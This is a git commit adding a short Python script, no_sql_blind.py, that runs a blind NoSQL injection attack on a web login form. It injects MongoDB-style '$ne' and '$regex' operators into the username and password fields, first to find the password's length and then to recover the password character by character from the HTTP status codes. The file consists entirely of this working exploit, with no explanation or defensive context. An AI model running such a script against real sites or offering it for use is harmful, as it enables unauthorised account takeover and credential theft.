0cd681b3ea4c768704f54a5973922767c1031813
Kevin Schmidt <kevinschmidt_113@hotmail.com>
2020-02-23 00:32:00 +0100

    Create no_sql_blind.py

---
+++ no_sql_blind.py
@@ -0,0 +1,38 @@
+import requests
+import string
+
+url = ""
+username = "admin"
+password = "^"
+
+possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
+
+def retrievePasswordLength(url, username):
+    for x in range(1, 25):
+        payload = {"username[$ne]":username, "password[$regex]":".{"+str(x)+"}", "login":"login"}
+        r = requests.post(url, data=payload, verify=False, allow_redirects=False)
+        #print(payload)
+        #print(r.status_code)
+        if int(r.status_code) == 200:
+            print("Password length is : {}".format(x-1))
+            break
+        elif int(r.status_code) == 302:
+            print("Not yet")
+
+#retrievePasswordLength(url, username)
+
+def retrievePasswordString(url, username, password):
+    restart = True
+    while restart:
+        restart = False
+        for c in possible_chars:
+            payload = {'username[$ne]':username, 'password[$regex]':password + c,'login':'login'}
+            r = requests.post(url, data=payload, verify=False, allow_redirects=False)
+            #print(c)
+            if int(r.status_code) == 302:
+                print("Found one more char : %s" % (password+c))
+                password += c
+                restart = True
+                break
+
+retrievePasswordString(url, username, password)
